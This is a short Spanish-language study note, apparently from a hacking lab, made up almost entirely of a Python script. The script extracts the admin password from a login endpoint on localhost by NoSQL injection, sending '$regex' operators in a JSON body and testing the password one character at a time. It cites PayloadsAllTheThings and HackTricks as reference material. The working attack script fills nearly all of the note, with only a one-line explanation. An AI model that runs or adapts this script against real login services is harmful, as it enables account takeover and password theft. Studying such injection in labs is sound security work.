Lo que hace es descubrir por medio de regex los caracteres de la contraseña
Material de Apoyo:
Payload All the things o Hactricks Nosq injection


`#!/usr/bin/python3`

`from pwn import *`
`import requests, time, sys, signal, string`

`def def_handler(sig, frame):`
    `print("\n\n[!] Saliendo...\n")`
    `sys.exit(1)`

`signal.signal(signal.SIGINT, def_handler)`

`login_url = "http://localhost:4000/user/login"`
`characters = string.ascii_lowercase + string.ascii_uppercase + string.digits`

`def makeNoSQLI():`
    
    `password = ""`
    
    `p1 = log.progress("Fuerza")`
    `p1.status("Iniciando proceso")`
    `time.sleep(2)`

    `p2 = log.progress("Password")`
    `for position in range(1, 24):`
        `for character in characters:`
            `# Aquí estaba el problema con el uso del operador %.`
            `post_data = '{"username":"admin","password":{"$regex":"^' + password + character + '"}}'`
            
            `p1.status(post_data)`
            `headers = {'Content-Type': 'application/json'}`

            `r = requests.post(login_url, headers=headers, data=post_data)`

            `if "Logged in as user" in r.text:  # Corregido el error tipográfico en "Logged iin"`
                `password += character`
                `p2.status(password)`
                `break`

`if __name__ == '__main__':`
    `makeNoSQLI()`
